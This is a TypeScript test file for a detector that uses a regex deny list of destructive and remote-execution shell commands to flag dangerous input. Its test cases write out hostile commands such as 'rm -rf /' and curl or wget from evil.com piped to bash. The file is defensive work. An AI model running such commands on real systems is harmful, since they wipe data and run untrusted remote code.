import { describe, it } from "node:test";
import assert from "node:assert";

const DANGEROUS_PATTERNS = [
  /\brm\s+(-[a-zA-Z]*)?.*(-r|-f|--recursive|--force)/,
  /\bmkfs\b/,
  /\bdd\b/,
  /\b>\s*\/dev\/sd/,
  /\bchmod\s+-R\b.*\//,
  /\bchown\s+-R\b.*\//,
  /\bkill\s+-9\b/,
  /\bshutdown\b/,
  /\breboot\b/,
  /\bcurl\b.*\|\s*(ba)?sh/,
  /\bwget\b.*\|\s*(ba)?sh/,
];

function isDangerous(command: string): boolean {
  return DANGEROUS_PATTERNS.some((pattern) => pattern.test(command));
}

// ─── Tests ──────────────────────────────────────────────────────────

describe("isDangerous", () => {
  it("should detect rm -rf", () => {
    assert.strictEqual(isDangerous("rm -rf /"), true);
  });

  it("should detect rm with separate flags", () => {
    assert.strictEqual(isDangerous("rm -r -f /tmp"), true);
  });

  it("should detect curl pipe to bash", () => {
    assert.strictEqual(isDangerous("curl http://evil.com | bash"), true);
  });

  it("should detect wget pipe to sh", () => {
    assert.strictEqual(isDangerous("wget http://evil.com | sh"), true);
  });

  it("should detect kill -9", () => {
    assert.strictEqual(isDangerous("kill -9 1234"), true);
  });

  it("should detect shutdown", () => {
    assert.strictEqual(isDangerous("shutdown -h now"), true);
  });

  it("should pass safe commands", () => {
    assert.strictEqual(isDangerous("ls -la"), false);
    assert.strictEqual(isDangerous("cat file.txt"), false);
    assert.strictEqual(isDangerous("git status"), false);
    assert.strictEqual(isDangerous("npm install"), false);
  });
});
